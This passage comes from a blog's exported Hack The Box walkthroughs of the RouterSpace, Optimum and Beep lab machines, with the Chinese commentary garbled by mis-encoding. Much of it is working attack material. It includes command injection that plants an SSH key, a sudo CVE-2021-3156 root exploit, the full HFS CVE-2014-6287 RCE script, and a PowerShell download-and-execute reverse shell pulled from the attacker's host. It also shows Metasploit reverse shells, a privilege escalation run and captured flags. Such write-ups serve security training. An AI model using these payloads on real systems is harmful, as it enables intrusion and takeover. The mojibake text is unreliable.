SF::57\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nGET,HEAD,POST&quot;)%r(RTSPRequest SF:,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n SF:&quot;)%r(X11Probe,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20 SF:close\\r\\n\\r\\n&quot;)%r(FourOhFourRequest,134,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Po SF:wered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20RouterSpace-76343\\r\\nContent-Type SF::\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2078\\r\\nETag:\\x20W SF:/\\&quot;4e-iLIX7S/AlC0nyhqE0lYp8aZLlm4\\&quot;\\r\\nDate:\\x20Mon,\\x2028\\x20Feb\\x2020 SF:22\\x2002:17:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSuspicious\\x20acti SF:vity\\x20detected\\x20!!!\\x20{RequestID:\\x20j7Q\\x20\\x20X53\\x20Qp3\\x20\\x20 SF:9o\\x207\\x20\\x20\\x20B2JL\\x20\\x20}\\n\\n\\n\\n\\n&quot;); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: VoIP adapter|general purpose Running: Cisco embedded, Linux 2.6.X OS CPE: cpe:/h:cisco:unified_call_manager cpe:/o:linux:linux_kernel:2.6.26 OS details: Cisco Unified Communications Manager VoIP adapter, Linux 2.6.26 (PCLinuxOS) TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 ... 30 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 287.18 seconds Httpå…ˆå»çœ‹çœ‹80ç«¯å£ è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªå…¬å¯“çš„è·¯ç”±ç®¡ç†ç³»ç»Ÿ å…ˆåˆ°å¤„çœ‹çœ‹ è¿™é‡Œå³ä¸Šè§’Downloadä¼šä¸‹è½½ä¸€ä¸ªapkåŒ…ï¼Œä¸‹è½½ä¸‹æ¥åä½¿ç”¨æ¨¡æ‹Ÿå™¨è¿è¡Œç„¶åburpæŠ“åŒ…çœ‹çœ‹ Apk https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd åœ¨Debianæ¶æ„çš„Linuxä¸­å®‰è£…AnBoxæ¨¡æ‹Ÿå™¨çš„æ–¹æ³• anbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity å®‰è£…åä»¥åå’±ä»¬å¯åŠ¨æ¨¡æ‹Ÿå™¨ adb shell settings put global http_proxy 192.168.31.208:8080 ç„¶åburpè®¾ç½®å¥½ç›‘å¬ç«¯å£ä»¥åï¼Œä½¿ç”¨burpå¯¹anboxè¿›è¡Œä»£ç† adb install RouterSpace.apk å®‰è£…appï¼Œç„¶åæ‰“å¼€ APKæ–‡ä»¶è¿è¡Œåå°±åªæœ‰ä¸€ä¸ªæŸ¥çœ‹çŠ¶æ€çš„æŒ‰é’®ï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹çœ‹ POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1 accept: application/json, text/plain, */* user-agent: RouterSpaceAgent Content-Type: application/json Content-Length: 16 Host: routerspace.htb Connection: close Accept-Encoding: gzip, deflate {&quot;ip&quot;:&quot;0.0.0.0&quot;} å°†routerspace.htbåŠ å…¥åˆ°hosts echo 10.10.11.148 routerspace.htb &gt;&gt; /etc/hosts æŠ“åŒ…ä¸‹æ¥åæ˜¯è¿™ä¹ˆä¸ªçŠ¶æ€ï¼Œå»æ”¾åŒ…çœ‹çœ‹ è¿™è¾¹æˆ‘æœ‰ä¸ªå¤§èƒ†çš„æƒ³æ³•ï¼Œçœ‹ç€è·ŸDVWAçš„å‘½ä»¤æ³¨å…¥å¾ˆç±»ä¼¼ï¼Œå»æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯è¡Œ æˆåŠŸè¢«æ‰§è¡Œäº†ï¼Œé‚£å°±å¥½ç©äº†ï¼Œå»æ„é€ POCæ‹¿shellå§ æ¼æ´åˆ©ç”¨ å°è¯•å†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯æ— æ³•æ‰§è¡ŒæˆåŠŸ è¯•è¯•èƒ½ä¸èƒ½æ‰§è¡Œå‘½ä»¤ è°ƒç”¨bashä¹Ÿå¤±è´¥äº† ç„¶ååœ¨&#x2F;home&#x2F;paul&#x2F;.ssh&#x2F;é‡Œä¹Ÿæ²¡æœ‰ä¸œè¥¿ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•åï¼Œ.sshé‡Œå¯ä»¥å†™å…¥æ–‡ä»¶ è¿™é‡Œçªç„¶å°±æœ‰ä¸ªæ€è·¯äº†ï¼Œç”Ÿæˆä¸€ä¸ªsshkeyï¼Œç„¶åå†™å…¥è¿›å»å°±å¯ä»¥sshç™»é™†äº† ssh-keygen ç„¶åå…¨éƒ¨é»˜è®¤å³å¯ç”Ÿæˆ ç„¶åæŠŠid_rsa.pubçš„å†…å®¹ä¿å­˜ä¸ºauthorized_keys {&quot;ip&quot;:&quot;0.0.0.0|echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMxVRUf56TSx5tkTab+gCMuO3EFgbMTbNlLOhqEvLiDLcST6zbYl0ofc4cGNguoi6ti6iyi8ZHyS8DjJ89thmpTrDiYXf39Z8QhkO2DaQkzh6FjvvGgY82pVBPtRq1qL0JrnOgqhGBigs3kPbd0kkdmOmDbmV1w1p9omfk2Tj/+q469S+1IVCtQIIvtNuuGTUeTMYQdCfFLOB4OVHBLvAuucIagK2DJrJLgcf0w/DQ/9X04luqhqQET8SfQqBpfn1nq/CcJvXsMlCGqbjE4m6c5l4WIaeAtfrhUdrVukSg0x/r1OJvEm4MgevR7eN/umwGP6yQVH34eBoTHoU6P+H3+9csDAMujbSCWJi3yGK9U5Q7Rei0DsiCrd6T0qbQuCmu4bUdJZfSZCGPCSxO7LRCQlNI13RLRTTUPh6cQn7eB+bnucs/YRgx2/O4b+EDsWGEveXQTpfbJxYLMeespC95v5Rj/vl1C3zqq2nIUIqXC13Y+966+92x4Y6vVmaKDC0= root@kali&#39; &gt; /home/paul/.ssh/authorized_keys&quot;} ç„¶åç»™700æƒé™ {&quot;ip&quot;:&quot;0.0.0.0|chmod 700 /home/paul/.ssh/authorized_keys&quot;} ç„¶åä½¿ç”¨sshè¿›è¡Œç™»é™† â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh paul@10.10.11.148 -i id_rsa The authenticity of host &#39;10.10.11.148 (10.10.11.148)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:M4jDfH65U/Fw7jjmKhTZcb9LgW/gi23OjcLjM1bA5UY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.148&#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 03 Mar 2022 11:30:25 AM UTC System load: 0.07 Usage of /: 71.7% of 3.49GB Memory usage: 31% Swap usage: 0% Processes: 214 Users logged in: 0 IPv4 address for eth0: 10.10.11.148 IPv6 address for eth0: dead:beef::250:56ff:feb9:888d 80 updates can be applied immediately. 31 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Mar 2 22:54:39 2022 from 10.10.14.27 paul@routerspace:~$ whoami&amp;&amp;id paul uid=1001(paul) gid=1001(paul) groups=1001(paul) æˆåŠŸæ‹¿åˆ°useræƒé™ paul@routerspace:~$ ls snap user.txt paul@routerspace:~$ cat user.txt a874812f3d7207b3f4ad32da4bc2bc84 æˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶ æƒé™æå‡é¦–å…ˆå»è·‘ä¸€ä¸ªlinpeas.shè„šæœ¬çœ‹çœ‹æœ‰æ²¡æœ‰ææƒç‚¹ https://github.com/LucifielHack/linpeas.sh/blob/main/linpeas.sh [+] Sudo version [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.31 è·‘å®Œä»¥åæˆ‘çœ‹åˆ°äº†è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œç„¶åå»æœç´¢ä¸€ä¸‹sudo 1.8.31çš„æ¼æ´ è¿™é‡Œçœ‹åˆ°äº†ä¸€ä¸ªæ¼æ´CVE-2021-3156 https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit paul@routerspace:~/Sudo-1.8.31-Root-Exploit$ make mkdir libnss_x cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c cc -O3 -o exploit exploit.c paul@routerspace:~/Sudo-1.8.31-Root-Exploit$ ./exploit # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),1001(paul) æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶ # cat /root/root.txt f3388fc86d949870742895a2c1d6f16e æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Optimum - Hackthebox","slug":"Hackthebox - Optimum","date":"2022-03-10T11:38:36.000Z","updated":"2023-05-20T02:42:35.000Z","comments":true,"path":"2022/03/10/Hackthebox - Optimum/","link":"","permalink":"http://www.lucifiel.com/2022/03/10/Hackthebox%20-%20Optimum/","excerpt":"","text":"Hackthebox - Optimumé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.8 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-09 23:06 EST Nmap scan report for 10.10.10.8 Host is up (0.52s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012 (85%) OS CPE: cpe:/o:microsoft:windows_server_2012 Aggressive OS guesses: Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 477.43 ms 10.10.16.1 2 477.52 ms 10.10.10.8 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 68.98 seconds Httpåªæœ‰ä¸€ä¸ª80ç«¯å£å¼€ç€ï¼Œå»çœ‹çœ‹HTTPçš„å†…å®¹ è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªæ–‡ä»¶æœåŠ¡å™¨ï¼Œè¯•è¯•æœ‰æ²¡æœ‰å¼±å£ä»¤å¯ä»¥ç™»å½•çš„ æµ‹è¯•äº†å‡ ä¸ªå¼±å£ä»¤ï¼Œéƒ½æ²¡ç™»å½•è¿›å»ï¼Œçœ‹çœ‹å…¶ä»–æ–¹æ³• è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªHttpFileServer 2.3ï¼Œå»searchsploitä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´ Searchsploitâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum] â””â”€# searchsploit HttpFileServer 2.3 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | windows/webapps/49125.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results è¿™é‡Œç¡®å®æœ‰ä¸€ä¸ªRCEï¼Œæµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ç”¨ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum] â””â”€# cat CVE-2014-6287.py # Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) # Google Dork: intext:&quot;httpfileserver 2.3&quot; # Date: 28-11-2020 # Remote: Yes # Exploit Author: Ã“scar Andreu # Vendor Homepage: http://rejetto.com/ # Software Link: http://sourceforge.net/projects/hfs/ # Version: 2.3.x # Tested on: Windows Server 2008 , Windows 8, Windows 7 # CVE : CVE-2014-6287 #!/usr/bin/python3 # Usage : python3 Exploit.py &lt;RHOST&gt; &lt;Target RPORT&gt; &lt;Command&gt; # Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 &quot;c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.4/shells/mini-reverse.ps1&#39;)&quot; import urllib3 import sys import urllib.parse try: http = urllib3.PoolManager() url = f&#39;http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}&#39; print(url) response = http.request(&#39;GET&#39;, url) except Exception as ex: print(&quot;Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command&quot;) print(ex) å°è¯•æ‰§è¡Œä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum] â””â”€# python3 CVE-2014-6287.py 10.10.10.8 80 whoami http://10.10.10.8:80/?search=%00{.+exec|whoami.} è¿™é‡Œæ²¡æœ‰ç»™æˆ‘ä»»ä½•å›æ˜¾ï¼Œæˆ‘ä¸ç¡®å®šæ˜¯å¦æ‰§è¡ŒæˆåŠŸäº†ï¼Œå»æµ‹è¯•ä¸€ä¸‹å§ æœ¬åœ°ä½¿ç”¨tcpdumpç›‘å¬ä¸€ä¸‹ç½‘å¡ï¼Œç„¶åæ‰§è¡Œä¸€ä¸‹pingæˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum] â””â”€# python3 CVE-2014-6287.py 10.10.10.8 80 &quot;ping 10.10.16.3&quot; http://10.10.10.8:80/?search=%00{.+exec|ping%2010.10.16.3.} â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# tcpdump -i tun0 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 23:25:22.516278 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [S], seq 2814804000, win 64240, options [mss 1460,sackOK,TS val 3571996960 ecr 0,nop,wscale 7], length 0 23:25:22.747740 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [S.], seq 3736611079, ack 2814804001, win 8192, options [mss 1355,nop,wscale 8,sackOK,TS val 122838 ecr 3571996960], length 0 23:25:22.747788 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 0 23:25:22.747968 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [P.], seq 1:143, ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 142: HTTP: GET /?search=%00%7B.+exec%7Cping%2010.10.16.3.%7D HTTP/1.1 23:25:23.203303 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 1:219, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 218: HTTP: HTTP/1.1 200 OK 23:25:23.203352 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 219, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0 23:25:23.203376 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [.], seq 219:1562, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP 23:25:23.203381 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 1562, win 498, options [nop,nop,TS val 3571997647 ecr 122884], length 0 23:25:23.204028 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 1562:1679, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 117: HTTP 23:25:23.204036 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 1679, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0 23:25:23.434280 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [.], seq 1679:3022, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP 23:25:23.434317 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 3022, win 501, options [nop,nop,TS val 3571997878 ecr 122884], length 0 23:25:23.434339 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 3022:3139, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 117: HTTP 23:25:23.434346 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 3139, win 501, options [nop,nop,TS val 3571997878 ecr 122884], length 0 23:25:23.434354 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 3139:4164, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1025: HTTP 23:25:23.434359 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 4164, win 498, options [nop,nop,TS val 3571997878 ecr 122884], length 0 23:25:23.437193 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [F.], seq 143, ack 4164, win 501, options [nop,nop,TS val 3571997881 ecr 122884], length 0 23:25:23.879455 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [.], ack 144, win 257, options [nop,nop,TS val 122953 ecr 3571997881], length 0 23:25:24.151025 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [F.], seq 4164, ack 144, win 257, options [nop,nop,TS val 122953 ecr 3571997881], length 0 23:25:24.151044 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 4165, win 501, options [nop,nop,TS val 3571998595 ecr 122953], length 0 23:25:47.421881 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172 23:25:48.422841 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172 23:25:49.424354 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172 23:25:50.425946 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172 ç¡®å®æ˜¯æˆåŠŸè¢«æ‰§è¡Œäº†ï¼Œé‚£å°±å¯ä»¥ç¡®è®¤è¯¥æ¼æ´æ˜¯å­˜åœ¨ï¼Œå¹¶ä¸”exploitä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ æ¼æ´åˆ©ç”¨æ–¹æ³• 1æ—¢ç„¶çŸ¥é“äº†ä»€ä¹ˆæ¼æ´å¯ä»¥ç”¨ï¼Œé‚£å°±ç®€å•äº†ï¼Œæ¥æ„é€ POCå§ æ ¹æ®CVE-2014-6287çš„æç¤ºï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä½¿ç”¨powershellè¿›è¡Œå›å¼¹ä¸€ä¸ªshellï¼Œå’±ä»¬æ‰¾ä¸€ä¸ªpowershellçš„åˆ©ç”¨å·¥å…· https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 æˆ‘è¿™è¾¹æ˜¯æ‰¾åˆ°ä¸€ä¸ªè„šæœ¬ï¼Œå’±ä»¬ç»™ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åå»å°è¯•æ‰§è¡Œ ç„¶åç¨å¾®ä¿®æ”¹ä¸€ä¸‹ Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444 æˆ‘ä»¬å°†è¿™å¥ä»£ç å¤åˆ¶ä¸‹æ¥ï¼Œç²˜è´´åˆ°ä»£ç æœ€åº•éƒ¨ï¼Œç„¶åæŠŠIPä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„IP ç„¶ååœ¨æœ¬åœ°ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡ python3 -m http.server 80 ç„¶åä½¿ç”¨expè¿›è¡Œä¸‹è½½ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum] â””â”€# python3 CVE-2014-6287.py 10.10.10.8 80 &quot;c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.16.3/Invoke-PowerShellTcp.ps1&#39;)&quot; http://10.10.10.8:80/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.16.3/Invoke-PowerShellTcp.ps1%27%29.} PS C:\\Users\\kostas\\Desktop&gt; whoami optimum\\kostas æˆåŠŸå¾—åˆ°äº†shell æ–¹æ³• 2msf6 &gt; search HttpFileServer 2.3 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/http/rejetto_hfs_exec 2014-09-11 excellent Yes Rejetto HttpFileServer Remote Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec msf6 &gt; use 0 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msfconsoleå¯ä»¥ç›´æ¥ä½¿ç”¨ msf6 exploit(windows/http/rejetto_hfs_exec) &gt; show options Module options (exploit/windows/http/rejetto_hfs_exec): Name Current Setting Required Description ---- --------------- -------- ----------- HTTPDELAY 10 no Seconds to wait before terminating web server Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.8 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes The path of the web application URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.3 yes The listen address (an interface may be specified) LPORT 5555 yes The listen port Exploit target: Id Name -- ---- 0 Automatic è®¾ç½®å¥½ç›¸å…³é…ç½®ï¼Œç„¶åæ‰§è¡Œ msf6 exploit(windows/http/rejetto_hfs_exec) &gt; exploit [*] Started reverse TCP handler on 10.10.16.3:5555 [*] Using URL: http://0.0.0.0:8080/zKFWDMqMmVKxA [*] Local IP: http://192.168.200.128:8080/zKFWDMqMmVKxA [*] Server started. [*] Sending a malicious request to / [*] Payload request received: /zKFWDMqMmVKxA [*] Sending stage (175174 bytes) to 10.10.10.8 [!] Tried to delete %TEMP%\\UZMLMeDqW.vbs, unknown result [*] Meterpreter session 1 opened (10.10.16.3:5555 -&gt; 10.10.10.8:49178) at 2022-03-10 00:02:29 -0500 [*] Server stopped. meterpreter &gt; getuid Server username: OPTIMUM\\kostas meterpreter &gt; sysinfo Computer : OPTIMUM OS : Windows 2012 R2 (6.3 Build 9600). Architecture : x64 System Language : el_GR Domain : HTB Logged On Users : 1 Meterpreter : x86/windows è¿™è¾¹ä¹ŸæˆåŠŸæ‹¿åˆ°äº†shell æƒé™æå‡ä½¿ç”¨systeminfoæˆ–å…¶ä»–æ–¹å¼éƒ½å¯ä»¥çœ‹åˆ°è¡¥ä¸ä¿¡æ¯ å»æœæŸ¥è¡¥ä¸ä¿¡æ¯ï¼Œæˆ–æ˜¯ä½¿ç”¨msfçš„ææƒè¾…åŠ©è„šæœ¬éƒ½å¯ä»¥çŸ¥é“ è¿™è¾¹MSFæœ‰ä¸ªææƒå¯ç”¨è„šæœ¬ use windows/local/ms16_032_secondary_logon_handle_privesc set SESSION 1 exploit msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) &gt; exploit [*] Started reverse TCP handler on 10.10.16.3:4444 [+] Compressed size: 1016 [*] Writing payload file, C:\\Users\\kostas\\AppData\\Local\\Temp\\IQyTwKukUqs.ps1... [*] Compressing script contents... [+] Compressed size: 3588 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -&gt; @FuzzySec] [?] Operating system core count: 2 [&gt;] Duplicating CreateProcessWithLogonW handle [?] Done, using thread handle: 1936 [*] Sniffing out privileged impersonation token.. [?] Thread belongs to: svchost [+] Thread suspended [&gt;] Wiping current impersonation token [&gt;] Building SYSTEM impersonation token [?] Success, open SYSTEM token handle: 2024 [+] Resuming thread.. [*] Sniffing out SYSTEM shell.. [&gt;] Duplicating SYSTEM token [&gt;] Starting token race [&gt;] Starting process race [!] Holy handle leak Batman, we have a SYSTEM shell!! xQiD0FWfxy0Q3rUwptuxobxZ7Fk20m8U [+] Executed on target machine. [*] Sending stage (200262 bytes) to 10.10.10.8 [*] Meterpreter session 2 opened (10.10.16.3:4444 -&gt; 10.10.10.8:49188) at 2022-03-10 00:34:05 -0500 [+] Deleted C:\\Users\\kostas\\AppData\\Local\\Temp\\IQyTwKukUqs.ps1 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM æˆåŠŸæ‹¿åˆ°systemæƒé™ meterpreter &gt; search -f user.txt.txt Found 1 result... c:\\Users\\kostas\\Desktop\\user.txt.txt (32 bytes) meterpreter &gt; cat &#39;c:\\Users\\kostas\\Desktop\\user.txt.txt&#39; d0c39409d7b994a9a1389ebf38ef5f73 meterpreter &gt; search -f root.txt Found 1 result... c:\\Users\\Administrator\\Desktop\\root.txt (32 bytes) meterpreter &gt; cat &#39;c:\\Users\\Administrator\\Desktop\\root.txt&#39; 51ed1b36553c8461f4552c2e92b3eeed æˆåŠŸæ‹¿åˆ°userå’Œrootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Beep - Hackthebox","slug":"Hackthebox - Beep","date":"2022-03-09T11:38:36.000Z","updated":"2023-05-20T01:22:13.000Z","comments":true,"path":"2022/03/09/Hackthebox - Beep/","link":"","permalink":"http://www.lucifiel.com/2022/03/09/Hackthebox%20-%20Beep/","excerpt":"","text":"Hackthebox - Beepé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Beep] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.7 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-04 00:36 EST Nmap scan report for 10.10.10.7 Host is up (6.6s latency). Not shown: 64293 filtered ports, 1232 closed ports PORT STATE SERVICE VERSION 22/tcp open tcpwrapped | ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA) |_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA) 25/tcp open tcpwrapped |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 80/tcp open tcpwrapped |_http-server-header: Apache/2.2.3 (CentOS) |_http-title: Did not follow redirect to https://10.10.10.7/ 110/tcp open tcpwrapped |_pop3-capabilities: STLS PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) RESP-CODES EXPIRE(NEVER) LOGIN-DELAY(0) TOP UIDL USER AUTH-RESP-CODE APOP 111/tcp open tcpwrapped | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open tcpwrapped |_imap-capabilities: THREAD=ORDEREDSUBJECT NAMESPACE OK MULTIAPPEND X-NETSCAPE QUOTA NO URLAUTHA0001 LISTEXT LIST-SUBSCRIBED CATENATE BINARY ID IDLE RIGHTS=kxte ANNOTATEMORE STARTTLS IMAP4 SORT=MODSEQ Completed IMAP4rev1 ACL UNSELECT RENAME UIDPLUS ATOMIC THREAD=REFERENCES MAILBOX-REFERRALS LITERAL+ CONDSTORE SORT CHILDREN 443/tcp open tcpwrapped | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2017-04-07T08:22:08 |_Not valid after: 2018-04-07T08:22:08 |_ssl-date: 2022-03-04T06:40:08+00:00; +59m59s from scanner time. 993/tcp open tcpwrapped |_imap-capabilities: CAPABILITY 995/tcp open 